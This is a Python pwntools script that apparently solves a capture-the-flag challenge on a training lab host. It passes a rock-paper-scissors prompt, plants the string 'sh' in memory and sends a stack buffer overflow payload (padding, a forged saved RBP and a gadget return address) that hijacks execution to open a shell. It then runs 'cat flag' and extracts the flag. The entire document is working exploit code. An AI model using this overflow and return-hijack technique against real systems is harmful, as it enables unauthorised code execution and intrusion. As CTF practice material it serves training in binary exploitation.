import re
from pwn import context, remote, p64

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(host: str, port: str, prefix: str) -> str:
    context.update({"log_level":"error"})
    flag = None
    target_rbp = 0x404080 + 0x20
    lea_gadget = 0x401298
    with remote(host, port) as rem:
        rem.sendlineafter(b"Scissors(0), Rock(1), Paper(2): \n", b"1")
        rem.sendlineafter(b"Start? (Y/N)\n", b"sh\x00")
        result = rem.recv(timeout=1).strip().decode()
        if "You Win!" in result:
            payload = b"A" * 32 + p64(target_rbp) + p64(lea_gadget) # buffer + rbp + ret
            rem.sendline(payload) # Your name:
            rem.sendline(b"cat flag")
            flag = get_flag(rem.recvline().strip().decode(), prefix)
    return flag

if __name__ == "__main__":
    host = "lab.eqst.co.kr"
    port = "8163"
    prefix = "EQST"
    while (flag := solution(host, port, prefix)) == None:
        continue
    print(flag)
    